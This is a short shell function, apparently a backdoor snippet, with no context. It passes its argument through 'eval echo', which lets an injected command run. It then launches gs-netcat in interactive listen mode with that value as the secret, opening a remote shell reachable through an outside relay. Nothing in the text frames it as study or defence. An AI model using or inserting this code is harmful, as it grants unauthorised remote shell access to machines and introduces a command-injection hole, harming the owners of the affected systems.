function handler () {
  SECRET=$(eval echo $1)
  ./gs-netcat -i -l -s "$SECRET"
}
